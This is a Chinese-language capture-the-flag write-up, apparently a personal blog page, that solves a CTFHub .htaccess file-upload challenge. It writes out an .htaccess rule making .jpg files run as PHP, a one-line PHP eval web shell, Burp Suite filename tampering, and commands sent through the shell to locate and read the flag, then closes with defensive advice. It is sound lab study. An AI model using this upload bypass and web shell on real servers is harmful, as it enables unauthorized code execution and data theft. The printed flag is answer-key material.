@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-htaccess Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href=" ">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-htaccess Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.19 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, 文件上传, htaccess, BurpSuite</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - 文件上传 / .htaccess</li>
+        <li><strong>题目名称：</strong>.htaccess</li>
+        <li><strong>提示：</strong>利用 Apache 服务器的分布式配置文件特性，修改文件解析规则</li>
+    </ul>
+
+    <h2>2. 解题思路</h2>
+    <p>本题的核心原理是 Apache 服务器特有的 <code>.htaccess</code> 文件。该文件可用于配置当前目录的网页行为。我们可以上传一个内容为 <code>AddType application/x-httpd-php .jpg</code> 的 <code>.htaccess</code> 文件，强制服务器将当前目录下的 <code>.jpg</code> 文件当作 PHP 脚本执行。随后，我们再上传一个包含木马代码的 <code>shell.jpg</code>，从而绕过常规的上传后缀限制，实现代码执行。</p >
+
+    <h2>3. 操作步骤</h2>
+    
+    <p><strong>第一步：本地文件制作与 Windows 绕坑</strong></p >
+    <p>由于 Windows 系统无法直接创建以点开头的特殊文件名，直接保存 <code>.htaccess</code> 会报错或变成 <code>.htaccess.txt</code>。</p >
+    <ul>
+        <li><strong>解决办法一（引号大法）：</strong>在 VS Code 保存时，将文件名输入为包含双引号的 <code>".htaccess"</code>，强行创建。</li>
+        <li><strong>解决办法二（曲线救国）：</strong>在本地创建一个正常的 <code>htaccess.txt</code>，上传时用 Burp Suite 拦截，手动将 <code>filename</code> 改为 <code>.htaccess</code>。</li>
+    </ul>
+    <p>随后创建 <code>shell.jpg</code>，内容仅包含 <code>&lt;?php @eval($_POST['cmd']); ?&gt;</code>。</p >
+
+    <p><strong>第二步：上传 .htaccess（修改规则）</strong></p >
+    <ol>
+        <li>开启 CTFHub 环境，确保 Burp 处于拦截开启状态。</li>
+        <li>在 Burp 浏览器中选择 <code>htaccess.txt</code> 上传。</li>
+        <li>拦截请求后，找到第16行 <code>filename="htaccess.txt"</code>，手动改为 <code>filename=".htaccess"</code>。直接放行，提示上传成功。</li>
+    </ol>
+
+    <p><strong>第三步：上传 shell.jpg 与 Repeater 连马（熟练操作）</strong></p >
+    <ol>
+        <li>在浏览器选择 <code>shell.jpg</code>，直接上传，无需修改任何数据包，放行。</li>
+        <li>将上传成功的请求发送至 <code>Repeater</code>，修改第一行为：<code>POST /upload/shell.jpg HTTP/1.1</code>。</li>
+        <li>修改 <code>Content-Type</code> 为 <code>application/x-www-form-urlencoded</code>，清空请求体，写入 <code>cmd=system("ls /");</code>。</li>
+        <li>将 <code>Content-Length</code> 改为 <strong>19</strong>，保留空行，点击 <code>Send</code>。成功回显根目录列表，证明 <code>.jpg</code> 被成功解析为 PHP！</li>
+    </ol>
+
+    <p><strong>第四步：全盘搜索 Flag（巧妙躲坑）</strong></p >
+    <ol>
+        <li>将请求体替换为：<code>cmd=system("find / -name flag* 2>/dev/null");</code>。手动计算长度，该命令长度为 <strong>45</strong>，修改 <code>Content-Length: 45</code>。点击 <code>Send</code>。</li>
+        <li>结果回显路径：<code>/var/www/html/flag_325144095.php</code>。</li>
+    </ol>
+
+    <p><strong>第五步：读取 Flag 与 PHP 原生函数破局</strong></p >
+    <ul>
+        <li><strong>试错踩坑：</strong>基于上一关的经验，我们深知 CTFHub 的沙盒环境可能为了安全（防止容器被逃逸）而禁用了某些高危系统命令（如 <code>cat</code>），或者限制了特定文件的读取权限。直接使用 <code>system("cat ...")</code> 极容易遭遇回显空白或截断。</li>
+        <li><strong>成功绕过：</strong>放弃底层系统命令，改用 PHP 原生函数读取。<br>
+        将请求体改为：<code>cmd=print_r(file_get_contents('/var/www/html/flag_325144095.php'));</code><br>
+        这行代码总长度为 <strong>67</strong>，修改 <code>Content-Length: 67</code>，点击 <code>Send</code>。</li>
+        <li><strong>结果：</strong>右侧成功完整打印出 Flag：<br><code>ctfhub{e354135699134bb823d6157a}</code></li>
+    </ul>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>Windows 特殊文件名机制：</strong>Windows 资源管理器无法直接创建以点开头的文件（如 <code>.htaccess</code>）。使用保存为 <code>".htaccess"</code> 的方式，或者在 Burp 中利用 <code>filename="htaccess.txt"</code> 改名，是两种最实用的解决手段。</li>
+        <li><strong>HTTP 协议细节再次重演：</strong>照例在第一行改 POST，清理 Body，精确计算 <code>Content-Length</code> 并保留空行。基础操作已经形成肌肉记忆。</li>
+        <li><strong>禁用函数带来的“虚假失败”（今日重点）：</strong>即使 <code>.htaccess</code> 成功生效、木马已经执行，我们也可能遇到 <code>system("cat ...")</code> 无回显的情况。此时不要怀疑漏洞利用失败，而应该立即调整策略，使用 <code>print_r()</code>、<code>file_get_contents()</code> 等 PHP 原生函数来读取文件。</li>
+        <li><strong>命令符号的极致严谨：</strong>在输入 <code>find</code> 命令时，曾因手误漏打了斜杠（误写为 <code>"-name flag*"</code> 而缺失开头的 <code>"find / "</code>），导致回显长度为 0。在后续的漏洞利用中，务必对 Shell 命令的长度和字符保持一丝不苟的严谨态度。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>htaccess 漏洞利用原理：</strong><code>.htaccess</code> 是 Apache 服务器的分布式配置文件。在允许上传的目录中上传该文件，通过 <code>AddType application/x-httpd-php .jpg</code> 等指令，可以强行改变服务器对指定后缀的解析行为，将静态资源（<code>.jpg</code>）转化为可执行的 PHP 脚本。</li>
+        <li><strong>沙盒环境下的策略选择：</strong>在受限的 Web 沙盒环境中，PHP 原生的文件读取函数（如 <code>file_get_contents</code>）比底层系统命令（如 <code>cat</code>）具有更高的可用性和稳定性，是安全测试中的必备替代方案。</li>
+        <li><strong>安全防御建议：</strong>严禁上传目录下出现 <code>.htaccess</code>、<code>.user.ini</code> 等配置文件；上传目录必须剥离脚本执行权限（可在 Nginx/Apache 配置中做 <code>Location</code> 限制）；强制重命名上传文件，防止用户自定义特殊后缀。最根本的方案是将 Web 服务与上传文件目录分离（即将上传目录设置为不可执行）。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
